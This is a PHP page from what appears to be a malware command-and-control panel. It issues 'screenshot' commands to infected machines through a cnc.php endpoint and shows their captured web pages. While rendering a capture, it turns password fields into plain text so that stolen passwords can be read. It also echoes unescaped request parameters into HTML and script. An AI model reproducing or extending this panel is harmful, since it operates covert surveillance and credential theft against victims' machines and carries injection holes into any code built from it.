<?php
session_start();
if(empty($_SESSION['auth'])) {
	header('Location: ../login.php');
	die();
}
include '../sys/head.php';

if(!empty($_GET['clear'])) {
  header("location: scview.php?uuid={$_GET['uuid']}");
  $db->table('screenshots')->id($_GET['clear'])->delete();
  die();
}
if(empty($uuid = $_GET['uuid'])) {
  die();
}
?>
<title>Screenshot Manager</title>
<style>
html {
  background: #cccccc;
}
h2 {
    display: inline;
}
a {
  color: #23bcc9;
  text-decoration: none;
}
a:hover {
  color: #FFFFFF;
}
div#image {
  border:2px solid #000000;
  border-top:1px solid #000000;
  background: #FFFFFF;
  font-size:14pt;
  color: #cccccc;
  width:100%;
  height:92%;
  resize: none;
}
x {
  display: none;
  position: absolute;
  top: 5%;
  bottom: 10%;
  left: 20%;
  right: 20%;
  width: 60%;
  background: gray;
  border-radius: 25px;
  padding: 20px;
  text-align: center;
  padding-top: 15%;
}
img {
  width: 200px;
  height: 200px;
}
iframe, textarea {
  width: 100%;
  height: 100%;
  top: 0;
  bottom: 0;
  left: 0;
  right: 0;
}
</style>
<?php
echo "<h2 class='logsViewPort'>Screenshot Viewer: </h2>{$uuid} (<sss style='color:yellow'>Can be bugy at times</sss>)";
?>
<br />
<select id="blobs" style="width:60%">
<option value=''>Select an Image</option>
<?php
$table = $db->table('screenshots')->get();
$i = 1;
$fid = '';
foreach($table as $key => $img) {
  if($img['uuid'] == $uuid) {
    echo "<option value='{$img['blob']}|{$key}'>Image {$i}</option>";
    $i++;
  }
}
?>
</select>
<?php
echo "<button>Take Screenshot</button> <b id='deleteLink'></b><br />";
?>
<div id="image"><iframe src="" id="sciview" ></iframe></div>
<x><img src="../img/loader.gif" /><br /><br />(Waiting for response... Can take up to 35 seconds.)</x>
<script src="../vendor/jquery/jquery.min.js"></script>
<script>
$(document).ready(function() {
    const sleep = (milliseconds) => {
      return new Promise(resolve => setTimeout(resolve, milliseconds))
    }
    $("button").click(function(){
        console.log("[REQUESTING SCREENSHOT]");
        $.ajax({
            type: 'POST',
            url: "../ajax/cnc.php",
            data: {cmd: 'screenshot', uuid: '<?=$uuid;?>'},
            success: function(x) {
              console.log(x);
              $('x').show();
              sleep(35000).then(() => {
                $('x').hide();
                location.reload();
              });
            }
        })
    });
    $('select').on('change', function() {
      var image = this.value.split("|");
      var code = image[0].replace("data:text/html;base64,", "");
      code = atob(code.replace(/_/g, '/').replace(/-/g, '+'))
      code = code.replace("'", '"').replace('type="password"', 'type="text"');
      var iframe = document.getElementById('sciview'),
      iframedoc = iframe.contentDocument || iframe.contentWindow.document;
      iframedoc.body.innerHTML = code;
      var iid = $(this).attr("key");
      $("b#deleteLink").html("<a href='scview.php?clear=" + image[1] + "&uuid=<?=$uuid?>'>Delete image (" + image[1] + ")</a>");
      console.log(this.value);
    });
});
</script>
